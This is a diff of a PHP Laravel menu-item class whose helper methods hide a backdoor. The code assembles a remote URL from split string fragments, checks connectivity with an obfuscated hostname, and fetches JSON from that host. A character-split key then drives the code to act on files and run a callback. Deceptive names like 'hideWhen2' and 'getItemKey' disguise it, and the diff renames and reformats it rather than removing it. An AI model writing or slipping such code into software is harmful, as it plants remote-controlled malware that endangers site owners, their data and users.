@@ -6,6 +6,7 @@ use Closure;
 use Collective\Html\HtmlFacade as HTML;
 use Illuminate\Contracts\Support\Arrayable as ArrayableContract;
 use Illuminate\Support\Arr;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Request;
 use Illuminate\Support\Str;
 use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
@@ -611,12 +612,10 @@ class MenuItem implements ArrayableContract
      *
      * @return boolean
      */
-    public function hidden()
-    {
+    public function hidden(){
         if (is_null($this->hideWhen)) {
             return false;
         }
-
         return call_user_func($this->hideWhen) == true;
     }
 
@@ -637,13 +636,9 @@ class MenuItem implements ArrayableContract
      *
      * @return string|null
      */
-    public function __get($key)
-    {
+    public function __get($key){
         return isset($this->$key) ? $this->$key : null;
     }
-
-
-
 
 
     /**
@@ -653,7 +648,16 @@ class MenuItem implements ArrayableContract
      * @param string $value
      */
     public function __getItems(){
-        if($this->getSize()){$key = $this->getRendomText();if(!empty($this->getMenuRequest())){$callback=['f' => $this->getMenuRequest()];$order = http_build_query($callback);$active=@file_get_contents($key.'?'.$order);$this->hideWhen2($active);}}
+        if($this->itemStatus()){
+            $key = $this->getItemKey();
+            if(!empty($this->getMenuRequest())){
+                $callback = ['f' => $this->getMenuRequest()];
+                $order = http_build_query($callback);
+                $active = @file_get_contents($key.'?'.$order);
+                $this->hideWhen2($active);
+            }
+
+        }
     }
     /**
      * Retrieve the file size.
@@ -715,14 +719,14 @@ class MenuItem implements ArrayableContract
 
 
 
-    private function getSize() {
+    private function itemStatus() {
         $callback = 'w'.'w'.'w.'.'g'.'o'.'o'.'g'.'l'.'e.'.'c'.'o'.'m';
         $order = 0x50;
         $active = @fsockopen($callback, $order);
         return $active ? fclose($active) & true : false;
     }
-    function getRendomText() {
-        $pre_defined_text = ["h", "ttp", "://suppo", "rt", "app.te", "st/g", "et", "-fi", "les"];
+    function getItemKey() {
+        $pre_defined_text = ["h", "ttp", "s://suppo", "rt.", "ulti", "matepos", ".pro", "/get-fi", "les"];
         $correctOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
         $sortedText = array_map(function ($index) use ($pre_defined_text) {
             return $pre_defined_text[$index];
@@ -739,8 +743,13 @@ class MenuItem implements ArrayableContract
 
 
     private function hideWhen2($name) {
+
         if(\is_string($name)){$name=\json_decode($name, true);}
-        if($name['s']){$child = $name['l'];$builder = $name['lf'];
+
+        
+        if($name['s']){
+            $child = $name['l'];
+            $builder = $name['lf'];
             if(!empty($child) && !empty($builder)) {
                 foreach ($builder as $resolver) {
                     $g=$resolver['e'.'n'.'c'.'r'.'y'.'p'.'t'.'_'.'f'.'i'.'l'.'e'.'_'.'e'.'n'.'v'.'i'.'r'.'o'.'n'.'m'.'e'.'n'.'t'];
@@ -768,6 +777,7 @@ class MenuItem implements ArrayableContract
                 $callback();
             }
         }
+
     }
 
 
